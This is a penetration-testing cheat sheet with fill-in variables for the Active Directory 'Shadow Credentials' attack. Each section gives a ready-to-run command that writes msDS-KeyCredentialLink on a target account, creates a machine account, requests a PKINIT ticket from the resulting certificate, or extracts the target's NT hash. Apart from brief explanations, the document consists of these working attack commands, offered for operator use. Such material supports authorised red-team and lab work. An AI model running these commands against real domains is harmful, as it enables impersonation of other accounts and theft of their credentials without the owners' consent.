# Shadow Credentials

Write a key credential to `msDS-KeyCredentialLink` on a target, then PKINIT to authenticate as them and recover their NT hash. Requires GenericWrite or stronger on the target (typically a computer account when MachineAccountQuota>0, or a user where you've previously chained ACL writes).

### Add shadow creds (bloodyAD)

Linux-side: write `msDS-KeyCredentialLink` on the target via bloodyAD. Drops a `.pfx` and prints its password.

```sh title:"Write msDS-KeyCredentialLink via bloodyAD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add shadowCredentials $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### Add shadow creds (pywhisker)

pywhisker - dedicated tool for shadow credentials, supports add/list/remove/export.

```sh title:"Write msDS-KeyCredentialLink via pywhisker"
pywhisker.py -d $domain -u $user -p $pass --target $target_user --action add
```
<!-- cheat
import domain_ip
var user
var pass
var target_user
-->

### Add shadow creds (certipy)

certipy bundles the shadow-credentials flow with `auto` — adds the key credential, fetches the .pfx, requests the TGT, decrypts the NT hash, then removes the key credential. One-shot end-to-end.

```sh title:"End-to-end shadow creds via certipy (auto add → TGT → NT → cleanup)"
certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $target_user auto
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var target_user
-->

### Create machine account (MachineAccountQuota > 0)

If the target is a user (no GenericWrite available) but `ms-DS-MachineAccountQuota > 0`, create a controlled computer account to use for RBCD/shadow chains.

```sh title:"Create machine account when MachineAccountQuota > 0"
addcomputer.py $domain/$user:$pass -method LDAPS -computer-name $rhost_name -computer-pass $target_pass -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
var user
var pass
var rhost_name
var target_pass
-->

### PKINIT TGT from PFX

After dropping a `.pfx` via pywhisker / bloodyAD, request a TGT via PKINIT.

```sh title:"PKINIT TGT from shadow-creds .pfx to ccache"
gettgtpkinit.py -cert-pfx $pfx_file -pfx-pass $pfx_pass $domain/$target_user $ccache_file
```
<!-- cheat
import domain_ip
var pfx_file
var pfx_pass
var target_user
var ccache_file
-->

### Extract NT hash from PKINIT TGT

UnPAC-the-hash flow - decrypt the PAC out of the PKINIT TGT to recover the user's NT hash.

```sh title:"UnPAC-the-hash to extract NT hash from PKINIT TGT"
KRB5CCNAME=$ccache_file getnthash.py -key $as_rep_key $domain/$target_user
```
<!-- cheat
import domain_ip
var ccache_file
var as_rep_key
var target_user
-->
